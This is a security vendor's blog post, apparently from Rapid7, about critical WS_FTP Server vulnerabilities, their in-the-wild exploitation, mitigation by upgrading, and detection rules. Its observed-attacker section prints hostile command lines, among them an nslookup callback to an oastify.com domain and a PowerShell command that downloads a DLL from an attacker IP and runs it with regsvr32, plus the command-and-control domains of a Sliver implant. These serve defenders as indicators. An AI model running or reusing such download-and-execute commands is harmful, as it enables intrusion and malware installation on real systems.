# Critical Vulnerabilities in WS_FTP Server | Rapid7 Blog

- **Source :** rapid7
- **URL :** https://www.rapid7.com/blog/post/2023/09/29/etr-critical-vulnerabilities-in-ws-ftp-server/
- **Date :** 2025-06-02

---

On September 27, 2023, Progress Software published a security advisory on multiple vulnerabilities affecting [WS_FTP Server](https://www.ipswitch.com/ftp-server), a secure file transfer solution. There are a number of vulnerabilities in the advisory, two of which are critical (CVE-2023-40044 and CVE-2023-42657). Our research team has identified what appears to be the .NET deserialization vulnerability (CVE-2023-40044) and confirmed that it is exploitable with a single HTTPS POST request and a pre-existing [ysoserial.net](https://github.com/pwntester/ysoserial.net) gadget. 

**Note:** As of September 30, Rapid7 has observed multiple instances of WS_FTP exploitation in the wild. We detail this activity in the **Observed Attacker Behavior** section of this blog. 

The vulnerabilities in the advisory span a range of affected versions, and several affect only WS_FTP servers that have the Ad Hoc Transfer module enabled. Nevertheless, Progress Software’s advisory urges all customers to update to WS_FTP Server 8.8.2, which is the latest version of the software. Rapid7 echoes this recommendation. The vendor advisory has guidance on upgrading, along with info on disabling or removing the Ad Hoc Transfer module. 

The critical vulnerabilities are below — notably, NVD scores [CVE-2023-40044](https://nvd.nist.gov/vuln/detail/CVE-2023-40044) as only being of “high” severity, not critical:

  * **CVE-2023-40044:** In WS_FTP Server versions prior to 8.7.4 and 8.8.2, the Ad Hoc Transfer module is vulnerable to a .NET deserialization vulnerability that allows an unauthenticated attacker to execute remote commands on the underlying WS_FTP Server operating system. The vulnerability affects all versions of the WS_FTP Server Ad Hoc module. Progress Software’s advisory indicates that WS_FTP Server installations without the Ad Hoc Transfer module installed are not vulnerable to CVE-2023-40044.   

  * **CVE-2023-42657:** WS_FTP Server versions prior to 8.7.4 and 8.8.2 are vulnerable to a directory traversal vulnerability that allows an attacker to perform file operations (delete, rename, rmdir, mkdir) on files and folders outside of their authorized WS_FTP folder path. Attackers could also escape the context of the WS_FTP Server file structure and perform the same level of operations (delete, rename, rmdir, mkdir) on file and folder locations on the underlying operating system.



Additional (non-critical) vulnerabilities are listed below. See [Progress Software’s advisory](https://community.progress.com/s/article/WS-FTP-Server-Critical-Vulnerability-September-2023) for full details: 

  * **CVE-2023-40045:** In WS_FTP Server versions prior to 8.7.4 and 8.8.2, the Ad Hoc Transfer module is vulnerable to reflected cross-site scripting (XSS). Delivery of a specialized payload could allow an attacker to execute malicious JavaScript within the context of the victim's browser.
  * **CVE-2023-40046:** The WS_FTP Server manager interface in versions prior to 8.7.4 and 8.8.2 is vulnerable to SQL injection, which could allow an attacker to infer information about the structure and contents of the database and execute SQL statements that alter or delete database elements. 
  * **CVE-2023-40047:** The WS_FTP Server Management module in versions prior to 8.8.2 is vulnerable to stored cross-site scripting (XSS), which could allow an attacker with administrative privileges to import an SSL certificate with malicious attributes containing cross-site scripting payloads. Once the cross-site scripting payload is successfully stored, an attacker could leverage this vulnerability to target WS_FTP Server admins with a specialized payload which results in the execution of malicious JavaScript within the context of the victim's browser. 
  * **CVE-2023-40048:** The Manager interface in WS_FTP Server version prior to 8.8.2 was missing cross-site request forgery (CSRF) protection on a POST transaction corresponding to a WS_FTP Server administrative function. 
  * **CVE-2023-40049:** In WS_FTP Server version prior to 8.8.2, an unauthenticated user could enumerate files under the 'WebServiceHost' directory listing. 
  * **CVE-2022-27665:** WS_FTP Server 8.6.0 is vulnerable to reflected XSS (via AngularJS sandbox escape expressions), which allows an attacker to execute client-side commands by inputting malicious payloads in the subdirectory search bar or Add folder filename boxes. For example, there is Client-Side Template Injection via subFolderPath to the ThinClient/WtmApiService.asmx/GetFileSubTree URI. 



## Observed Attacker Behavior

In the evening hours of September 30, 2023, Rapid7 observed what appears to be exploitation of one or more recently disclosed WS_FTP vulnerabilities in multiple customer environments. Individual alerts our team responded to occurred within minutes of one another between 2023-10-01 01:38:43 UTC and 01:41:38 UTC.

The process execution chain looks the same across all observed instances, indicating _possible_ mass exploitation of vulnerable WS_FTP servers. Additionally, our MDR team has observed the same Burpsuite domain used across all incidents, which may point to a single threat actor behind the activity we've seen.

**Great-grandparent Process:**  
C:\Windows\SysWOW64\inetsrv\w3wp.exe -ap "WSFTPSVR_WTM" -v "v4.0" -l "webengine4.dll" -a \\\\.\pipe\iisipm18823d36-4194-409a-805b-cea0f4389a0c -h "C:\inetpub\temp\apppools\WSFTPSVR_WTM\WSFTPSVR_WTM.config" -w "" -m 1 -t 20 -ta 0

**Grandparent Process:**  
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Windows\Microsoft.NET\Framework\v4.0.30319\Temporary ASP.NET Files\aht\e514712b\a2ab2de1\ryvjavth.cmdline

**Parent Process:**  
C:\Windows\Microsoft.NET\Framework\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Windows\TEMP\RES6C8F.tmp" "c:\Windows\Microsoft.NET\Framework\v4.0.30319\Temporary ASP.NET Files\aht\e514712b\a2ab2de1\CSCCEF3EFC08A254FF1848B4D8FBBA6D0CE.TMP

**Child Process:**  
C:\Windows\System32\cmd.exe" /c cmd.exe /C nslookup 2adc9m0bc70noboyvgt357r5gwmnady2.oastify.com

Rapid7 managed services also observed the following attack chain:

**Great-grandparent Process:**  
C:\WINDOWS\SysWOW64\inetsrv\w3wp.exe -ap "WSFTPSVR_WTM" -v "v4.0" -l "webengine4.dll" -a \\\\.\pipe\iisipme6a8a618-bb7f-470c-92e9-58204f6ffcfa -h "C:\inetpub\temp\apppools\WSFTPSVR_WTM\WSFTPSVR_WTM.config" -w "" -m 1 -t 20 -ta 0

**Grandparent Process:**  
C:\Windows\System32\cmd.exe" /c powershell /c "IWR http://172.245.213[.]135:3389/bcrypt -OutFile c:\users\public\NTUSER.dll

**Parent Process:**  
powershell /c "IWR http://172.245.213[.]135:3389/bcrypt -OutFile c:\users\public\NTUSER.dll

**Child Process:**  
C:\Windows\System32\cmd.exe" /c regsvr32 c:\users\public\NTUSER.dll

Upon execution, NTUSER.dll reaches out to a Cloudflare worker at status.backendapi-fe4[.]workers[.]dev which drops an additional file, stage2.zip, into memory. Stage2.zip contains another executable within that appears to be using Golang and communicates with the domain realtime-v1[.]backendapi-fe4[.]workers[.]dev. Analysis of NTUSER.dll determined it to be associated with the Sliver post-exploitation framework.

## Mitigation guidance

Progress Software security advisories have borne increased scrutiny and garnered broader attention from media, users, and the security community since the Cl0p ransomware group’s May 2023 [attack on MOVEit Transfer](/blog/post/2023/06/01/rapid7-observed-exploitation-of-critical-moveit-transfer-vulnerability/). Secure file transfer technologies more generally continue to be popular targets for researchers and attackers. 

Since there is active exploitation of WS_FTP Server as of September 30, we advise updating to a fixed version on an emergency basis, without waiting for a typical patch cycle to occur. As noted in the advisory, "upgrading to a patched release using the full installer is the only way to remediate this issue. There will be an outage to the system while the upgrade is running." 

The optimal course of action is to update to 8.8.2 as the vendor has advised. If you are using the Ad Hoc Transfer module in WS_FTP Server and are not able to update to a fixed version, consider disabling or removing the module. 

See [Progress Software's advisory](https://community.progress.com/s/article/WS-FTP-Server-Critical-Vulnerability-September-2023) for the latest information.

## Rapid7 customers

InsightVM and Nexpose customers running WS_FTP can assess their exposure to all eight of the CVEs in this blog with authenticated vulnerability checks available in today’s (September 29) content release.

InsightIDR and Managed Detection and Response customers have existing detection coverage through Rapid7's expansive library of detection rules. The following detection rules are deployed and alerting on activity related to WS_FTP Server exploitation:

  * Suspicious Process - WS_FTP Server Process Spawns CMD Child Process
  * Webshell - IIS Spawns CMD To Spawn PowerShell
  * Webshell - IIS Spawns PowerShell
  * Webshell - Commands Launched by Webserver
  * Suspicious Process - Burpsuite Related Domain in Command Line



Velociraptor [has an artifact](https://docs.velociraptor.app/exchange/artifacts/pages/ws_ftp/) to detect strings associated with potential exploitation of WS_FTP in IIS logs. 

## Updates

**September 30:** Updated to note Rapid7 is observing multiple instances of WS_FTP exploitation in the wild and Velociraptor has an artifact available to assist in threat hunting. Proof-of-concept exploit code for CVE-2023-40044 is also publicly available as of the evening of Friday, September 29. Assetnote, who discovered CVE-2023-40044, has a full write-up out [here](https://www.assetnote.io/resources/research/rce-in-progress-ws-ftp-ad-hoc-via-iis-http-modules-cve-2023-40044) as of September 30.

**October 1:** Updated with details on a second attack chain observed by Rapid7 managed services.

**October 2:** Updated to specify detection rules alerting on WS_FTP Server exploitation for Rapid7 MDR and InsightIDR customers.

[**Download Rapid7's 2023 Mid-Year Threat Report**](/info/2023-mid-year-threat-review/) ▶︎

## Article tags

  * [Emergent Threat Response](/blog/tag/emergent-threat-response/)
  * [Research](/blog/tag/research/)